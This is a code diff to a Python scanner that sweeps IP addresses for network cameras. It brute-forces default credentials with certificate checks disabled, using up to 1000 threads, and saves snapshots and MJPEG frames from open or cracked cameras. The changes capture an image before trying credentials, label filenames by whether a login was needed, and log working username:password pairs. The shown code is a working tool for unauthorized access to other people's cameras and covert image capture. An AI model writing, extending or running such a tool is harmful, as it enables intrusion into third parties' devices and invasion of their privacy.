@@ -268,7 +268,8 @@ def capture_camera_image(url, auth=None):
                             
                         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                         safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
-                        filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}.jpg"
+                        auth_str = '_auth' if auth else '_open'
+                        filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}{auth_str}.jpg"
                         
                         if img.mode != 'RGB':
                             img = img.convert('RGB')
@@ -298,7 +299,8 @@ def capture_camera_image(url, auth=None):
                                     img = Image.open(io.BytesIO(frame))
                                     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                                     safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
-                                    filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}_mjpeg.jpg"
+                                    auth_str = '_auth' if auth else '_open'
+                                    filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}{auth_str}_mjpeg.jpg"
                                     img.save(filename, 'JPEG', quality=95)
                                     print(f"✓ Captured MJPEG frame from {mjpeg_url} -> {filename}")
                                     return True
@@ -353,14 +355,20 @@ def save_camera(url, reason):
         with open(RESULTS_FILE, "a") as f:
             f.write(f"{datetime.now()} - {url} - {reason}\n")
 
-def try_auth(url, auth):
-    try:
-        r = requests.get(url, auth=auth, timeout=1, verify=False)
-        if r.status_code == 200:
-            save_camera(url, f"Auth success: {auth}")
-            return True
-    except:
-        pass
+def try_auth(url):
+    for creds in DEFAULT_CREDS:
+        try:
+            if not creds:
+                continue
+                
+            r = requests.get(url, auth=creds, timeout=1, verify=False)
+            if r.status_code == 200:
+                if capture_camera_image(url, auth=creds):
+                    save_camera(url, f"Auth success with {creds[0]}:{creds[1]} and captured image")
+                    return True
+                    
+        except:
+            continue
     return False
 
 MAX_THREADS = 1000
@@ -382,11 +390,15 @@ def scan_ip(ip):
             return
             
         save_camera(url, 'Open camera')
-        if try_auth(url):
+        
+        if capture_camera_image(url):
+            save_camera(url, 'Successfully captured open camera image')
             return
             
-        capture_camera_image(url)
-        
+        if try_auth(url):
+            save_camera(url, 'Successfully authenticated and captured image')
+            return
+            
     except requests.exceptions.RequestException:
         try:
             url = f'https://{ip}'
@@ -396,11 +408,15 @@ def scan_ip(ip):
                 return
                 
             save_camera(url, 'Open camera (HTTPS)')
-            if try_auth(url):
+            
+            if capture_camera_image(url):
+                save_camera(url, 'Successfully captured open camera image (HTTPS)')
                 return
                 
-            capture_camera_image(url)
-            
+            if try_auth(url):
+                save_camera(url, 'Successfully authenticated and captured image (HTTPS)')
+                return
+                
         except:
             pass
     except:
@@ -469,13 +485,15 @@ def quick_check_url(ip, port, path):
 def try_default_creds(url):
     for creds in DEFAULT_CREDS:
         try:
-            if creds is None:
+            if not creds:
                 continue
+                
             r = requests.get(url, auth=creds, timeout=TIMEOUT, verify=False)
             if r.status_code == 200:
-                save_camera(url, f"Auth success with {creds[0]}:{creds[1]}")
-                capture_camera_image(url, auth=creds)
-                return True
+                if capture_camera_image(url, auth=creds):
+                    save_camera(url, f"Auth success with {creds[0]}:{creds[1]} and captured image")
+                    return True
+                    
         except:
             continue
     return False
